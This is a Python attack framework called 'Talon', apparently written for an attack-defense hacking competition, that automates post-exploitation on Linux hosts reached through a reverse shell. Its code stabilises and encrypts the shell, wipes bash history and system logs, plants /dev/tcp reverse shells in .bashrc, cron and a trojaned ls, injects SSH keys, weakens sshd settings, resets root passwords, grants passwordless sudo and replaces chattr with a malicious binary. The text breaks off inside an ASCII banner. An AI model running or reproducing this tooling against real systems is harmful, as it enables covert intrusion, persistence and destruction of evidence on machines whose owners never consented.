#!/usr/bin/python3
#created by S1n1st3r

import shutil
import hashlib
import subprocess
import tempfile
import time
import urllib.request
import sys
import random
import string
import crypt
import ssl
import warnings
import socket
import base64
import re
import os
import threading
import signal
from time import sleep
import argparse
warnings.filterwarnings("ignore", category=DeprecationWarning) 

DEFAULT_NETSTAT = "/var/tmp/netstat.txt"
IOC_STRING = "07f34df3ad1de759f25a655363ef09b5"
FLAG_LOCATIONS = ["/flag.txt"]
IOC_LOCATION = "/var/rand"
BAD_CHATTR_LOCATION = "/var/tmp/chattr.c"
#location of PwnKit.c file
PWNKIT_LOCATION = "/var/tmp/PwnKit.c"
PAM_BACKDOOR_LOCATION = "/var/tmp/backdoor.sh"
PAM_PATCH_LOCATION = "/var/tmp/backdoor.patch"
#our IP to catch reverse shell
IP = "10.2.18.7"
#our port to catch reverse shell
PORT = 51602
REVERSING_PORT = 31863
ID_RSA_PUB = "/var/tmp/id_rsa.pub"
#run PwnKit?
RUN_PWNKIT = 1
BIND_SHELL_PORT = 62672
ROOT = False
PASS = b"CyberVT2024NCX??"
STEALTH = False
BLACKLIST = []
IPs = []
PYTHON_VERSION = "python3"
ADSTYLE = "plant" #plant or flags
#pick one of the flag locations to use
flag_location = FLAG_LOCATIONS[0]
CERT_FILE = "/var/tmp/cert.crt"
KEY_FILE = "/var/tmp/key.key"
SECURE = False

#info stored in /var/tmp/info/


def parseArgs():
    arg_parser = argparse.ArgumentParser(description='Talon')
    arg_parser.add_argument('-i', '--ip', help='IP to listen on', required=False)
    arg_parser.add_argument('-p', '--port', help='Port to listen on', required=False)
    arg_parser.add_argument('-r', '--reverse_port', help='Port to reverse shell to', required=False)
    arg_parser.add_argument('-s', '--stealth', help='Stealth mode', required=False)
    arg_parser.add_argument('-a', '--adstyle', help='AD style (plant or flags)', required=False)
    arg_parser.add_argument('-f', '--flag_location', help='Flag location', required=False)
    arg_parser.add_argument('-k', '--key_location', help='Key location', required=False)
    arg_parser.add_argument('-b', '--bind_shell', help='Bind shell port', required=False)
    arg_parser.add_argument('-c', '--chattr_location', help='Bad Chattr location', required=False)
    arg_parser.add_argument('-l', '--pam_location', help='Pam location', required=False)
    arg_parser.add_argument('-m', '--pam_patch_location', help='Pam Patch Location', required=False)
    arg_parser.add_argument('-n', '--netstat_location', help='Default Netstat location', required=False)
    arg_parser.add_argument('-o', '--pwnkit_location', help='PwnKit location', required=False)
    arg_parser.add_argument('-u', '--id_rsa', help='id_rsa.pub location', required=False)
    arg_parser.add_argument('-w', '--passwd', help='Password', required=False)
    arg_parser.add_argument('-x', '--run_pwnkit', help='Run PwnKit', required=False)
    arg_parser.add_argument('-y', '--ioc_location', help='IOC location', required=False)
    arg_parser.add_argument('-z', '--ioc_string', help='IOC string', required=False)
    arg_parser.add_argument('-t', '--cert_file', help='Cert file', required=False)
    arg_parser.add_argument('-q', '--key_file', help='Key file', required=False)
    args = arg_parser.parse_args()
    if args.ip:
        global IP
        IP = args.ip
    if args.port:
        global PORT
        PORT = int(args.port)
    if args.reverse_port:
        global REVERSING_PORT
        REVERSING_PORT = int(args.reverse_port)
    if args.stealth:
        global STEALTH
        STEALTH = args.stealth
    if args.adstyle:
        global ADSTYLE
        ADSTYLE = args.adstyle
    if args.flag_location:
        global flag_location
        flag_location = args.flag_location
    if args.key_location:
        global ID_RSA_PUB
        ID_RSA_PUB = args.key_location
    if args.bind_shell:
        global BIND_SHELL_PORT
        BIND_SHELL_PORT = int(args.bind_shell)
    if args.chattr_location:
        global BAD_CHATTR_LOCATION
        BAD_CHATTR_LOCATION = args.chattr_location
    if args.pam_location:
        global PAM_BACKDOOR_LOCATION
        PAM_BACKDOOR_LOCATION = args.pam_location
    if args.netstat_location:
        global DEFAULT_NETSTAT
        DEFAULT_NETSTAT = args.netstat_location
    if args.pwnkit_location:
        global PWNKIT_LOCATION
        PWNKIT_LOCATION = args.pwnkit_location
    if args.id_rsa:
        ID_RSA_PUB = args.id_rsa
    if args.passwd:
        global PASS
        PASS = args.passwd.encode()
    if args.run_pwnkit:
        global RUN_PWNKIT
        RUN_PWNKIT = int(args.run_pwnkit)
    if args.ioc_location:
        global IOC_LOCATION
        IOC_LOCATION = args.ioc_location
    if args.ioc_string:
        global IOC_STRING
        IOC_STRING = args.ioc_string
    if args.cert_file:
        global CERT_FILE
        CERT_FILE = args.cert_file
    if args.key_file:
        global KEY_FILE
        KEY_FILE = args.key_file
    if args.pam_patch_location:
        global PAM_PATCH_LOCATION
        PAM_PATCH_LOCATION = args.pam_patch_location
    #print summary of settings
    print("IP: " + IP)
    print("PORT: " + str(PORT))
    print("REVERSING_PORT: " + str(REVERSING_PORT))
    print("STEALTH: " + str(STEALTH))
    print("ADSTYLE: " + ADSTYLE)
    print("flag_location: " + flag_location)
    print("ID_RSA_PUB: " + ID_RSA_PUB)
    print("BIND_SHELL_PORT: " + str(BIND_SHELL_PORT))
    print("BAD_CHATTR_LOCATION: " + BAD_CHATTR_LOCATION)
    print("PAM_BACKDOOR_LOCATION: " + PAM_BACKDOOR_LOCATION)
    print("PAM PATCH LOCATION: " + PAM_PATCH_LOCATION)
    print("DEFAULT_NETSTAT: " + DEFAULT_NETSTAT)
    print("PWNKIT_LOCATION: " + PWNKIT_LOCATION)
    print("id_rsa.pub: " + ID_RSA_PUB)
    print("PASS: ************")
    print("RUN_PWNKIT: " + str(RUN_PWNKIT))
    print("IOC_LOCATION: " + IOC_LOCATION)
    print("IOC_STRING: " + IOC_STRING)
    print("CERT_FILE: " + CERT_FILE)
    print("KEY_FILE: " + KEY_FILE)

def signal_handler(sig, frame):
    print('Exiting...')
    sys.exit(0)

def socket_create_and_listen():
    host = '0.0.0.0'
    port = random.randint(1024, 50000)
    s = socket.socket()
    sec_comms = ssl.wrap_socket(s, certfile=CERT_FILE, keyfile=KEY_FILE, ssl_version=ssl.PROTOCOL_TLSv1_2)
    try:
        sec_comms.bind((host, port))
    except OSError:
        print('Address already in use, trying another port...')
        port = random.randint(1024, 50000)
    sec_comms.listen(5)
    print(f"Listening on {port} for encrypted connections...")
    return sec_comms, port

def upgrade_to_encrypted_shell(conn, s, port):
    print("=================Upgrading to encrypted shell=================")
    client_template = f"""{PYTHON_VERSION} -c "import os, socket, subprocess, ssl, sys; host, port = '{IP}', {port}; s = socket.socket(); ssls = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1_2); ssls.connect((host, port)); exec('while True:\\n try:\\n  data = ssls.recv(1024).decode(\\\\'utf-8\\\\');\\n  if data == \\\\'quit\\\\': break;\\n  if data[:2] == \\\\'cd\\\\': os.chdir(data[3:]);\\n  else:\\n   proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);\\n   output = proc.stdout.read() + proc.stderr.read();\\n   ssls.send(output);\\n except Exception as e: print(e);')" \n"""
    conn.send(client_template.encode())
    print("Sent encrypted shell command. Waiting for connection...")
    conn2, address = s.accept()
    print("Encrypted shell connection established.")
    return conn2

def encrypt_traffic(conn):
    s, port = socket_create_and_listen()
    encrypted_conn = upgrade_to_encrypted_shell(conn, s, port)
    SECURE = True
    return encrypted_conn

def exploit(conn):
    print("=================Running exploit=================")
    try:
        print("blah")
    except Exception as e:
        print("=================Error in exploit=================: \n" + str(e))

def privesc(conn):
    #write anything custom needed to priv esc here
    try:
        print("=================Running privesc=================")
    except Exception as e:
        print("=================Error in privesc=================: " + str(e))



def stabalize_shell(conn):
    print("=================Stabalizing shell=================")
    try:
        #check for python
        conn.send(b"which python\n")
        if b"/python" in conn.recv(1024):
            PYTHON_VERSION = "python"
            conn.send(b"python -c \"import pty;pty.spawn('/bin/bash')\"\n")
            sleep(0.2)
            print(conn.recv(1024).decode('utf-8'))
        else:
            conn.send(b"which python3\n")
            if b"/python3" in conn.recv(1024):
                conn.send(b"python3 -c \"import pty;pty.spawn('/bin/bash')\"\n")
                sleep(0.2)
                print(conn.recv(1024).decode('utf-8'))
    except:
        print("=================Error in stabalize_shell=================")

def establish_opsec(conn):
    sleep(1)
    print("=================Establishing opsec=================")
    try:
        conn.send(b"printf \"\" > ~/.bash_history\n")
        sleep(0.2)
        conn.send(b"unset HISTFILE\n")
        sleep(0.2)
        conn.send(b"ln -sf /dev/null ~/.bash_history\n")
        sleep(0.2)
        if ROOT:
            conn.send(b"printf \"\" > /var/log/auth.log\n")
            sleep(0.2)
            conn.send(b"ln -sf /dev/null /var/log/auth.log\n")
            sleep(0.2)
            conn.send(b"printf \"\" > /dev/null | tee /var/log/syslog\n")
            sleep(0.2)
            conn.send(b"printf \"\" > /dev/null | tee /var/log/kern.log\n")
            sleep(0.2)
            conn.send(b"printf \"\" > /dev/null | tee /var/log/lastlog\n")
            sleep(0.2)
    except Exception as e:
        print("=================Error in establish_opsec=================:" + str(e))

def info_collection(conn):
    sleep(2)
    print("=================Collecting info=================")
    try:
        sleep(0.2)
        conn.send(b"netstat -plant\n")
        sleep(0.2)
        netstat = conn.recv(2056).decode('utf-8')
        #get ip of machine
        sleep(0.2)
        conn.send(b"hostname -I\n")
        sleep(0.2)
        ip = clean_output(conn.recv(1024).decode('utf-8'), b"hostname -I\n".decode('utf-8'))
        #get username without id or whoami commands
        sleep(0.2)
        conn.send(b"printf $USER\n")
        sleep(0.2)
        user = clean_output(conn.recv(1024).decode('utf-8'), b"printf $USER\n".decode('utf-8'))
        #get hostname
        sleep(0.2)
        #check if has permissions
        conn.send(b"sudo -l\n")
        sleep(0.2)
        sudo = conn.recv(1024).decode('utf-8')
        #check if prompted for password or not allowed
        if "password" in sudo.lower() or "not allowed" in sudo.lower():
            print("No permissions")
            sudo = "No permissions"
        else:
            print("Has permissions")
            sudo = "Has permissions"
            global ROOT
            ROOT = True
        conn.send(b"hostname\n")
        sleep(0.2)
        hostname = clean_output(conn.recv(1024).decode('utf-8'), b"hostname\n".decode('utf-8'))
        #see if IOC location file exsists
        sleep(0.2)
        #loop through FLAG_LOCATIONS array and grab each one
        FLAGS = []
        for location in FLAG_LOCATIONS:
            conn.send(b"bash -c 'builtin echo \"$(<" + location.encode() + b")\"'\n")
            sleep(0.2)
            FLAGS += conn.recv(1024).decode('utf-8')
        FLAGS = "".join(FLAGS).split("\n")
        print(FLAGS)     
        ioc = "None found"
        conn.send(b"ls " + IOC_LOCATION.encode() + b"\n")
        data = conn.recv(1024)
        if b"ls: cannot access" not in data or b"No such file" not in data:
            print("IOC found on machine")
            sleep(0.2)
            conn.send(b"bash -c 'builtin echo \"$(<" + IOC_LOCATION.encode() + b")\"'\n")
            sleep(0.2)
            ioc = clean_output(conn.recv(1024).decode('utf-8'), (b"builtin echo \"$(<" + IOC_LOCATION.encode() + b")\"\n").decode('utf-8'))
        #write info to file
        #check if /var/tmp/info/ directory exsists
        os.system("mkdir -p /var/tmp/info/")
        sleep(0.2)
        hostname = hostname.replace(" ", "")
        #clean any non alphanumeric characters from hostname
        hostname = re.sub(r'\W+', '', hostname)
        os.system("touch /var/tmp/info/" + hostname + ".txt")
        with open("/var/tmp/info/" + hostname + ".txt", "a") as f:
            f.write("Hostname: \n" + hostname + "\n")
            f.write("IP: \n" + ip + "\n")
            f.write("User: \n" + user + "\n")
            f.write("Netstat: \n" + netstat + "\n")
            f.write("IOC: \n" + ioc + "\n")
            f.write("Sudo: \n" + sudo + "\n")
            for flag in FLAGS:
                f.write("Flag: \n" + flag + "\n")
    except Exception as e:
        print("=================Error in info_collection=================: " + str(e))

def persist(conn):
    sleep(2)
    try:
        #add reverse shell to rc.local
        #conn.send(b"echo \"bash -i >& /dev/tcp/" + socket.gethostbyname(socket.gethostname()).encode() + b"/51435 0>&1\" >> /etc/rc.local\n")
        sleep(0.2)
        #add line to echo IOC to flag location in .bashrc
        conn.send(b"printf \"printf \'" + IOC_STRING.encode() + b"\' > " + flag_location.encode() + b"\n\" >> ~/.bashrc\n")
        sleep(0.2)
        shebang = b"#!/bin/bash\n"
        encoded_shebang = base64.b64encode(shebang).decode('utf-8')
        #add reverse shell to .bashrc
        conn.send(b"printf 'if [[ $- == *i* ]] && [ -z \"$SKYLINE\" ]; then\n' >> ~/.bashrc\n")
        sleep(0.2)
        conn.send(b"printf '    export SKYLINE=1\n' >> ~/.bashrc\n")
        sleep(0.2)
        conn.send(b"printf \"    bash -c \\\"printf \'" + encoded_shebang.encode() + b"\' | base64 -d > /var/tmp/.tmp/run && printf \'export SKYLINE=1\nbash -i >& /dev/tcp/" + IP.encode() + b"/" + str(REVERSING_PORT).encode() + b" 0>&1\' >> /var/tmp/.tmp/run 2>/dev/null && chmod +x /var/tmp/.tmp/run 2>/dev/null && /var/tmp/.tmp/run 2>/dev/null &\\\"\" >> ~/.bashrc\n")
        sleep(0.2)
        conn.send(b"printf '\nfi\n' >> ~/.bashrc\n")
        sleep(0.2)
    except Exception as e:
        print(e)
        print("=================Error in persisting using .bashrc=================")
    if not STEALTH and ROOT:
        print("=================Persisting=================")
        try:
            #add reverse shell to crontab
            conn.send(b"mkdir -p /var/tmp/.tmp\n")
            sleep(0.2)
        except:
            print("=================Error in mkdir section of persist=================")
        try:
            conn.send(b"bash -c \'printf \"#!/bin/bash\n/bin/sh -i >& /dev/tcp/" + IP.encode() + f"/{REVERSING_PORT} 0>&1\n\" > /var/tmp/.tmp/cron\'\n".encode())
            sleep(0.2)
            conn.send(b"chmod +x /var/tmp/.tmp/cron\n")
            sleep(0.2)
            conn.send(b"bash -c \'printf \"*/2 * * * * /var/tmp/.tmp/cron.txt\n\" > /var/tmp/.tmp/cron\'\n")
            sleep(0.2)
            conn.send(b"chmod +x /var/tmp/.tmp/cron.txt\n")
            sleep(0.2)
            #check if /etc/crontab contains */2 in it
            conn.send(b"bash -c \'builtin echo $(< /etc/crontab)\'\n")
            sleep(0.2)
            crontab = conn.recv(1024).decode('utf-8')
            if "*/2" not in crontab:
                #replace '17 *    * * *' in /etc/crontab with '17 */2 * * * *'
                conn.send(b"sed -i 's/17/\\*\\/2/g' /etc/crontab")
                sleep(0.2)
                conn.send(b"sed -i 's/cron\\.hourly/.cron.hourly/' /etc/crontab\n")
                sleep(0.2)
                # save reverse shell to /etc/.cron.hourly/hourly
                conn.send(b"mkdir -p /etc/.cron.hourly\n")
                sleep(0.2)
                conn.send(b"bash -c \'printf \"#!/bin/bash\n/bin/sh -i >& /dev/tcp/" + IP.encode() + f"/{REVERSING_PORT} 0>&1\n\" > /etc/.cron.hourly/hourly\n\'\n".encode())
                sleep(0.2)
                conn.send(b"chmod +x /etc/.cron.hourly/hourly\n")
                sleep(0.2)
            conn.send(b"service cron start\n")
            sleep(0.2)
        except Exception as e:
            print(e)
            print("=================Error in echo cron.txt section of persist=================")
        try:
            conn.send(b"bash -c \'crontab /var/tmp/.tmp/cron.txt\'\n")
            sleep(0.2)
        except:
            print("=================Error in execute crontab section of persist=================")
        try:
            #add ssh key to authorized_keys
            try:
                conn.send(b"mkdir ~/.ssh\n")
                sleep(0.2)
                conn.send(b"mkdir /usr/games/.ssh\n")
                sleep(0.2)
                conn.send(b"mkdir /var/spool/news\n")
                sleep(0.2)
                conn.send(b"mkdir /var/spool/news/.ssh\n")
                sleep(0.2)
                conn.send(b"mkdir ~/.skyline\n")
                sleep(0.2)
                conn.send(b"mkdir /usr/games/.skyline\n")
                sleep(0.2)
                conn.send(b"mkdir /var/spool/news/.skyline\n")
                sleep(0.2)
            except:
                print("=================Error in mkdir section of ssh persist=================")
            #get current home directory
            conn.send(b"printf $HOME\n")
            sleep(0.2)
            home = conn.recv(1024)
            #remove any bracketed text
            home = re.sub(r'\[.*?\]', '', home.decode('utf-8'))
            print("\n\n")
            #get the from the first b'/' to the next b' '
            try:
                home = home[home.find('/'):home.find(' ')]
                print(home)
            except Exception as e:
                print(e)
                print("=================Error in getting home directory=================")
            #check if /var/tmp/id_rsa.pub exsists
            if not os.path.isfile(ID_RSA_PUB):
                #move id_rsa.pub to /var/tmp/
                shutil.copy("./id_rsa.pub", ID_RSA_PUB)
            #send pub key from /var/tmp/id_rsa.pub locally
            #remove new lines from /var/tmp/id_rsa.pub
            os.system("sed -i 's/\\r//g' /var/tmp/id_rsa.pub")
            os.system("sed -i 's/\\n//g' /var/tmp/id_rsa.pub")
            with open(ID_RSA_PUB, "r") as f:
                conn.send(b"bash -c \'printf \"" + f.read().encode() + b"\" > " + home.encode().replace(b"2004l", b"").replace(b"\n", b"").replace(b"\r", b"") + b" ~/.ssh/authorized_keys\'\n")
                sleep(0.2)
                conn.send(b"bash -c \'printf \"" + f.read().encode() + b"\" > " + home.encode().replace(b"2004l", b"").replace(b"\n", b"").replace(b"\r", b"") + b" /usr/games/.ssh/authorized_keys\'\n")
                sleep(0.2)
                conn.send(b"bash -c \'printf \"" + f.read().encode() + b"\" > " + home.encode().replace(b"2004l", b"").replace(b"\n", b"").replace(b"\r", b"") + b" /var/spool/news/.ssh/authorized_keys\'\n")
                sleep(0.2)
                conn.send(b"bash -c \'printf \"" + f.read().encode() + b"\" > " + home.encode().replace(b"2004l", b"").replace(b"\n", b"").replace(b"\r", b"") + b" ~/.skyline/scorechk\'\n")
                sleep(0.2)
                conn.send(b"bash -c \'printf \"" + f.read().encode() + b"\" > " + home.encode().replace(b"2004l", b"").replace(b"\n", b"").replace(b"\r", b"") + b" /usr/games/.skyline/scorechk\'\n")
                sleep(0.2)
                conn.send(b"bash -c \'printf \"" + f.read().encode() + b"\" > " + home.encode().replace(b"2004l", b"").replace(b"\n", b"").replace(b"\r", b"") + b" /var/spool/news/.skyline/scorechk\'\n")
                sleep(0.2)
            #edit /etc/ssh/sshd_config
        except:
            print("=================Error in persisting using ssh keys=================")
        try:
            #set allowed users to games, news, and root
            conn.send(b"bash -c \'printf \"AllowUsers sky_scorebot games news\" >> /etc/ssh/sshd_config\'\n")
            sleep(0.2)
            conn.send(b"bash -c \'printf \"AuthorizedKeysFile      .skyline/scorechk .skyline/scorechk\" >> /etc/ssh/sshd_config\'\n")
            sleep(0.2)
            conn.send(b"bash -c \'printf \"PermitRootLogin no\" >> /etc/ssh/sshd_config\'\n")
            sleep(0.2)
            conn.send(b"bash -c \'printf \"PasswordAuthentication yes\" >> /etc/ssh/sshd_config\'\n")
            sleep(0.2)
            conn.send(b"bash -c \'printf \"PermitEmptyPasswords yes\" >> /etc/ssh/sshd_config\'\n")
            sleep(0.2)
            conn.send(b"bash -c \'printf \"PermitUserEnvironment yes\" >> /etc/ssh/sshd_config\'\n")
            sleep(0.2)
            conn.send(b"bash -c \'printf \"PermitTunnel yes\" >> /etc/ssh/sshd_config\'\n")
            sleep(0.2)
            conn.send(b"bash -c \'printf \"GatewayPorts yes\" >> /etc/ssh/sshd_config\'\n")
            sleep(0.2)
            conn.send(b"bash -c \'printf \"AllowTcpForwarding yes\" >> /etc/ssh/sshd_config\'\n")
            sleep(0.2)
            conn.send(b"bash -c \'printf \"X11Forwarding yes\" >> /etc/ssh/sshd_config\'\n")
            sleep(0.2)
            conn.send(b"bash -c \'printf \"X11DisplayOffset 10\" >> /etc/ssh/sshd_config\'\n")
            sleep(0.2)
            conn.send(b"bash -c \'printf \"X11UseLocalhost no\" >> /etc/ssh/sshd_config\'\n")
            sleep(0.2)
            conn.send(b"bash -c \'printf \"PrintMotd no\" >> /etc/ssh/sshd_config\'\n")
            sleep(0.2)
            conn.send(b"bash -c \'printf \"PrintLastLog no\" >> /etc/ssh/sshd_config\'\n")
            sleep(0.2)
            conn.send(b"bash -c \'printf \"TCPKeepAlive yes\" >> /etc/ssh/sshd_config\'\n")
            sleep(0.2)
            conn.send(b"bash -c \'printf \"ClientAliveInterval 60\" >> /etc/ssh/sshd_config\'\n")
            sleep(0.2)
            conn.send(b"bash -c \'printf \"ClientAliveCountMax 3\" >> /etc/ssh/sshd_config\'\n")
            sleep(0.2)
            #move /sky_scorebot/.ssh/authorized_keys to /sky_scorebot/.skyline/scorechk
            conn.send(b"mv /sky_scorebot/.ssh/authorized_keys /sky_scorebot/.skyline/scorechk\n")
            sleep(0.2)
            conn.send(b"service sshd restart\n")
            sleep(0.7)
            conn.send(b"service ssh restart\n")
            sleep(0.7)
            print(conn.recv(1024).decode('utf-8'))
        except:
            print("=================Error in persisting using sshd_config=================")
        try:
            #change password for games
            conn.send(b"bash -c \"printf games:" + PASS + b" | chpasswd\"\n")
            sleep(0.5)
            #change password for news
            conn.send(b"bash -c \"printf news:" + PASS + b" | chpasswd\"\n")
            sleep(0.5)
            #edit root
            conn.send(b"bash -c \"printf root:" + PASS + b" | chpasswd\"\n")
            sleep(0.5)
            conn.send(b"bash -c \"printf admin:" + PASS + b" | chpasswd\"\n")
            sleep(0.5)
            #set login shell for games and news to /bin/bash
            conn.send(b"chsh -s /bin/bash games\n")
            sleep(0.2)
            conn.send(b"chsh -s /bin/bash news\n")
            sleep(0.2)
            #create group admin
            conn.send(b"groupadd admin\n")
            sleep(0.5)
            #add games and news to admin group
            conn.send(b"usermod -a -G admin games\n")
            sleep(0.2)
            conn.send(b"usermod -a -G admin news\n")
            sleep(0.2)
            #add admin group to sudoers
            conn.send(b"bash -c \'printf \"admin ALL=(ALL) NOPASSWD:ALL\n\" >> /etc/sudoers\'\n")
            sleep(0.2)
        except:
            print("=================Error in persisting using sudoers=================")
        try:
            #get cat binary location
            conn.send(b"which ls\n")
            sleep(0.2)
            ls_location = conn.recv(1024)
            while b"/ls" not in ls_location:
                ls_location = conn.recv(1024)
                sleep(0.2)
            print(ls_location)
            ls_location = ls_location.decode('utf-8').replace("\n", "")
            #move cat to /bin/lister
            conn.send(b"mv " + ls_location.encode() + b" /bin/lister\n")
            sleep(0.2)
            #do some stuff we did to bashrc but with cat location as a new bash script
            conn.send(f"bash -c \'printf \"#!/bin/bash\n\" > {ls_location}\n\'\n".encode())
            sleep(0.2)
            conn.send(f"printf 'if [ -z \"$SKYLINE\" ]; then\n' >> {ls_location}\n".encode())
            sleep(0.2)
            conn.send(f"bash -c \'printf \"    export SKYLINE=1\n\" >> {ls_location}\n\'\n".encode())
            sleep(0.2)
            shebang = b"#!/bin/bash\n"
            encoded_shebang = base64.b64encode(shebang).decode('utf-8')
            conn.send(b"printf \"    printf \'" + encoded_shebang.encode() + b"\' | base64 -d > /var/tmp/.tmp/run && printf \'export SKYLINE=1\nbash -i >& /dev/tcp/" + IP.encode() + b"/" + str(REVERSING_PORT).encode() + f" 0>&1\' >> /var/tmp/.tmp/run 2>/dev/null && chmod +x /var/tmp/.tmp/run 2>/dev/null && /var/tmp/.tmp/run 2>/dev/null &\" >> {ls_location}\n".encode())
            sleep(0.2)
            conn.send(f"bash -c \'printf \"\nfi\n\" >> {ls_location}\n\'\n".encode())
            sleep(0.2)
            #use lister to cat the file
            conn.send(f"printf '/bin/lister $1\n' >> {ls_location}\n\n".encode())
            sleep(0.2)
            conn.send(f"chmod +x {ls_location}\n".encode())

        except Exception as e:
            print("=================Error in persisting using cat backdoor=================: " + str(e))
            print(e)
        try:
            #write BAD_CHATTR_LOCATION to machine
            with open(BAD_CHATTR_LOCATION, "r") as f:
                #base64 encode the file
                file = f.read()
                #replace '#define USER_NAME_TO_PRINT "flag"
                file = file.replace('#define USER_NAME_TO_PRINT "s1n1st3r"', '#define USER_NAME_TO_PRINT "' + IOC_STRING + '"')
                #replace '#define FILE_TO_PRINT_USER_NAME_TO "flag.txt"' with the last part of flag location
                file = file.replace('#define FILE_TO_PRINT_USER_NAME_TO "flag.txt"', '#define FILE_TO_PRINT_USER_NAME_TO "' + flag_location.split("/")[-1] + '"')
                file = base64.b64encode(file.encode())
                #write the file to /var/tmp/random.c
                #chunk and send
                chunk_size = 500
                chunks = [file[i:i+chunk_size] for i in range(0, len(file), chunk_size)]
                for chunk in chunks:
                    conn.send(b"printf \"" + chunk + b"\" | base64 -d >> /var/tmp/random.c\n")
                    sleep(0.2)
            #get chattr location
            sleep(0.2)
            print(conn.recv(1024).decode('utf-8'))
            conn.send(b"which chattr\n")
            sleep(0.2)
            chattr_location = clean_output(conn.recv(1024).decode('utf-8'), b"which chattr\n".decode('utf-8'))
            #move chattr to /bin/dancer
            sleep(0.2)
            print(chattr_location)
            conn.send(b"rm " + chattr_location.encode() + b"\n")
            #compile BAD_CHATTR_LOCATION
            sleep(0.2)
            conn.send(b"gcc /var/tmp/random.c -o " + chattr_location.encode() + "\n")
            print("compiling")
            sleep(5)
            print(conn.recv(1024).decode('utf-8'))
            #remove BAD_CHATTR_LOCATION
            conn.send(b"rm /var/tmp/random.c\n")
            sleep(0.2)
            print(conn.recv(1024).decode('utf-8'))
        except:
            print("=================Error in persisting using chattr=================")

def plant_IOC(conn):
    sleep(3)
    print("=================Planting IOC=================")
    try:
        #plant IOC
        sleep(0.2)
        if not STEALTH:
            conn.send(b"/bin/dancer -i " + IOC_LOCATION.encode() + b"\n")
        else:
            conn.send(b"chattr +i " + IOC_LOCATION.encode() + b"\n")
        sleep(0.2)
        conn.send(b"printf \"" + IOC_STRING.encode() + b"\" > " + IOC_LOCATION.encode() + b"\n")
        sleep(0.2)
        conn.send(b"chmod 555 " + IOC_LOCATION.encode() + b"\n")
        #set IOC to immutable
        sleep(0.2)
        conn.recv(1024)
        #check if chattr is installed
        conn.send(b"which chattr\n")
        sleep(0.2)
        chattr_location = clean_output(conn.recv(1024).decode('utf-8'), b"which chattr\n".decode('utf-8'))
        if chattr_location == '':
            #use BAD_CHATTR_LOCATION
            conn.send(b"/bin/dancer +i " + IOC_LOCATION.encode() + b"\n")
            sleep(0.2)
        else:
            #use chattr
            conn.send(b"" + chattr_location.encode() + b" +i " + IOC_LOCATION.encode() + b"\n")
            sleep(0.2)
        sleep(0.2)
    except Exception as e:
        print("=================Error planting IOC, prob permissions=================")
        print(e)

def pass_flags(conn):
    # check if the server is running apache or nginx
    sleep(1)
    print("=================Passing flags=================")
    try:
        conn.send(b"which apache2\n")
        sleep(0.2)
        apache = clean_output(conn.recv(1024).decode('utf-8'), b"which apache2\n".decode('utf-8'))
        conn.send(b"which nginx\n")
        sleep(0.2)
        nginx = clean_output(conn.recv(1024).decode('utf-8'), b"which nginx\n".decode('utf-8'))
        if apache != '' or nginx != '':
            #check if php is installed
            conn.send(b"which php\n")
            sleep(0.2)
            php = clean_output(conn.recv(1024).decode('utf-8'), b"which php\n".decode('utf-8'))
            flag_location_php = ""
            for location in flag_location:
                flag_location_php += location + ","
            #sha256 the password
            password = hashlib.sha256(PASS.encode()).hexdigest()
            for location in flag_location:
                flag_location_php += location + ","
            if php != '':
                #add php page that gives flag if password is correct, check using public key, and is sent with POST request.
                php_page = """<?php
                if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                    $password = $_POST['password'];
                    $check_pass = "{password}";
                    #sha256 the password
                    $password = hash('sha256', $password);
                    if ($password == $check_pass) {
                        $flag_locations = explode(",", "{flag_location}");
                        $flags = "";
                        foreach ($flag_locations as $location) {
                            $flags .= file_get_contents($location);
                            $flags .= "\n";
                        }
                        echo $flags;
                    }
                    else {
                        echo "Invalid request";
                    }

                }
                else {
                    echo "Invalid request";
                }
                ?>"""
                php_page = php_page.replace("{flag_location}", flag_location_php)
                php_page = php_page.replace("{password}", password)
                src = base64.b64encode(php_page.encode())
                conn.send(b"bash -c \'printf \"" + src + b"\" | base64 -d > /var/www/html/index.bak.php\'\n")
        else:
            print("No web server found")
    except Exception as e:
        print("=================Error passing flags=================")
        print(e)


def clean_output(output, runCommand):
    #remove the <user>@<host> part of the output, there are multiple parts so loop through
    prompt_pattern = r'^(?!\s)\S+@\S+:\S+\$ '
    clean_output = re.sub(prompt_pattern, '', output, flags=re.MULTILINE).strip()
    #remove '[?2004l' from output
    clean_output = clean_output.replace('[?2004l', '')
    if '\n' in clean_output:
        lines = clean_output.split('\n')
        command = lines[-1].strip()
        result = '\n'.join(lines[:-1]).strip()
    else:
        command = ''
        result = clean_output
    if '\n' in result:
        lines = result.split('\n')
        result2 = lines[-1].strip()
        command = '\n'.join(lines[:-1]).strip()
    else:
        command = ''
        result2 = clean_output
    if command:
        result2 = result2.replace(command, '').strip()
    if runCommand in result2:
        result2 = result2.replace(runCommand.decode('utf-8'), '').strip()
    return result2

def verification(conn):
    #check the ip address against known ip addresses
    ip = conn.getpeername()[0]
    if ip in BLACKLIST:
        return False
    verification_commands = [b'which id', b'which whoami', b'which hostname', b'which uname', b'which netstat', b'which cat', b'which ls', b'which rm', b'which mv', b'which cp', b'which chmod', b'which chown']
    i = 0
    while i < 1:
        try:
            conn.send(random.choice(verification_commands) + b"\n")
            sleep(0.2)
            if b"/" + random.choice(verification_commands).split()[-1] in conn.recv(1024):
                if ADSTYLE == "flags":
                    IPs.append(ip)
                return True
        except:
            pass
    BLACKLIST.append(ip)
    return False


def handler(conn):
    print("================= Connection from " + conn.getpeername()[0] +" =================")
    sleep(0.2)
    #check connection by running 'which id' and seeing if response contains '/id'
    #print("\033[?2004l", end="")
    print("================= Verifying connection =================")
    if verification(conn):
        print("================= Connection verified =================")
        stabalize_shell(conn)
        establish_opsec(conn)
        conn = encrypt_traffic(conn)
        exploit(conn)
        privesc(conn)
        info_collection(conn)
        persist(conn)
        if ADSTYLE == "plant":
            plant_IOC(conn)
        else:
            pass_flags(conn)
        #print done on (the ip of the connection) and close connection
        print("================= Done on " + conn.getpeername()[0] + " =================")
        print("================= Waiting for shell to connect on port " + str(PORT) + " =================")
    conn.send(b"exit\n")
    conn.close()

def main():
    print("================= Welcome to Talon by S1n1st3r =================")
    print("""                                                           .@@@@@@@@@.                              
                                                         @@@.       .@:                             
                                                       #@@   .@@@@#.  @.                            
                                                      @@.  .   .@@..@@ @                            
                                                   -@@@   @..@@.    .@@@.                           
                                                  @.@@.    @@@@        .                            
                                                .@  @@    #@  @@                                    
                                               .@.  .@@@@@@.   @                   +@@@@@@.         
